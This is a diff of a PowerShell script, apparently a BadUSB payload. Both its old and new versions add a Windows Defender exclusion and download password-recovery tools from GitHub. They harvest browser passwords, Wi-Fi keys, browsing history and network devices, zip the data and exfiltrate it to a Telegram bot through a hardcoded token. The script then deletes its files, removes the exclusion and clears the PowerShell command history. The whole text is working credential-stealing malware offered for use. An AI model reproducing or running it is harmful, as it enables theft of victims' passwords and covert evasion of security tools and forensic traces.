@@ -1,51 +1,103 @@
+#                      _                        
+#  _   _  ___  _   _  | | ___ __   _____      __
+# | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
+# | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
+#  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
+#  |___/                                        
+
 $basePath = "C:\Users\Public\Documents\scripts"
-$dumpFolder = "$basePath\Report"
-$dumpFile = "$basePath\data.zip"
+$dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
+$dumpFile = "$dumpFolder.zip"
 
-# 1. Подготовка
-if (Test-Path $basePath) { Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue }
-New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
+# Create directory
+New-Item -ItemType Directory -Path $basePath -Force | Out-Null
 Set-Location $basePath
+New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
+Add-MpPreference -ExclusionPath $basePath -Force
 
-# 2. Исключение
-Add-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue
+# Download necessary tools
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe
 
-# 3. Скачивание (используем твои ссылки)
-$linkMy = "https://raw.githubusercontent.com/whetherit/tools/main/WebBrowserPassView.exe"
-$linkWifi = "https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/WirelessKeyView.exe"
-$linkNet = "https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/WNetWatcher.exe"
 
-Invoke-WebRequest $linkMy -OutFile "WebBrowserPassView.exe"
-Invoke-WebRequest $linkWifi -OutFile "WirelessKeyView.exe"
-Invoke-WebRequest $linkNet -OutFile "WNetWatcher.exe"
+# Execute tools to gather data
+.\WNetWatcher.exe /stext connected_devices.txt
+.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt
+.\WebBrowserPassView.exe /stext passwords.txt
+.\WirelessKeyView.exe /stext wifi.txt
 
-# РАЗБЛОКИРОВКА (обязательно!)
-Get-ChildItem "$basePath\*.exe" | Unblock-File
-
-# 4. Запуск с ожиданием (Wait)
-# Параметр -Wait не даст скрипту идти дальше, пока программа не запишет файл
-Start-Process -FilePath ".\WebBrowserPassView.exe" -ArgumentList "/stext passwords.txt" -WindowStyle Hidden -Wait
-Start-Process -FilePath ".\WirelessKeyView.exe" -ArgumentList "/stext wifi.txt" -WindowStyle Hidden -Wait
-Start-Process -FilePath ".\WNetWatcher.exe" -ArgumentList "/stext connected_devices.txt" -WindowStyle Hidden -Wait
-
-# Дополнительная пауза на всякий случай
-Start-Sleep -Seconds 2
-
-# 5. Собираем ТОЛЬКО текстовые файлы
-$files = Get-ChildItem -Path . -Filter "*.txt"
-if ($files) {
-    Move-Item $files -Destination $dumpFolder -Force
-    Compress-Archive -Path "$dumpFolder\*" -DestinationPath $dumpFile -Force
+# Wait for the files to be fully written
+while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt") -or !(Test-Path "connected_devices.txt") -or !(Test-Path "history.txt")) {
+    Start-Sleep -Seconds 1
 }
 
-# 6. Отправка
+Move-Item passwords.txt, wifi.txt, connected_devices.txt, history.txt -Destination "$dumpFolder"
+
+# Compress extracted data
+Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force
+
+# Wait until the ZIP file is created
+while (!(Test-Path "$dumpFile")) {
+    Start-Sleep -Seconds 1
+}
+
+# Telegram configuration
 $token = "8453011015:AAFvYt0ZjgkUFAjtnLvONdmXl19l7GK9tfM"
 $chatID = "806761221"
+$uri = "https://api.telegram.org/bot$token/sendDocument"
+$caption = "Here are exfiltrated informations from $env:USERNAME"
 
-if (Test-Path $dumpFile) {
-    & curl.exe -F "chat_id=$chatID" -F "document=@$dumpFile" "https://api.telegram.org/bot$token/sendDocument"
+# Check if the file exists before sending
+if (!(Test-Path $dumpFile)) {
+    exit 1
 }
 
-# 7. Очистка
-Set-Location "C:\Users\Public"
-Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
+# Ensure System.Net.Http is available
+if (-not ("System.Net.Http.HttpClient" -as [type])) {
+    $httpPath = Get-ChildItem -Path "C:\Windows\Microsoft.NET\Framework64\" -Recurse -Filter "System.Net.Http.dll" | Select-Object -First 1 -ExpandProperty FullName
+    if ($httpPath) {
+        Add-Type -Path $httpPath
+    } else {
+        exit 1
+    }
+}
+
+# Create HTTP client
+$client = New-Object System.Net.Http.HttpClient
+$content = New-Object System.Net.Http.MultipartFormDataContent
+$content.Add((New-Object System.Net.Http.StringContent($chatID)), "chat_id")
+$content.Add((New-Object System.Net.Http.StringContent($caption)), "caption")
+
+# Attach the ZIP file
+$filename = [System.IO.Path]::GetFileName("$dumpFile")
+$fileStream = [System.IO.File]::OpenRead("$dumpFile")
+$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
+$content.Add($fileContent, "document", $filename)
+
+# Send data to Telegram
+try {
+    $client.PostAsync($uri, $content).Wait()
+} catch {}
+
+# Cleanup
+$fileStream.Close()
+$fileStream.Dispose()
+
+Set-Location C:\Users\Public\Documents
+Remove-Item -Recurse -Force scripts
+Remove-MpPreference -ExclusionPath "C:\Users\Public\Documents\scripts" -Force
+
+# Caps Lock signal
+$keyBoardObject = New-Object -ComObject WScript.Shell
+for ($i=0; $i -lt 4; $i++) {
+    $keyBoardObject.SendKeys("{CAPSLOCK}")
+    Start-Sleep -Seconds 1
+}
+
+# Clear command history
+Clear-Content (Get-PSReadlineOption).HistorySavePath
+
+exit
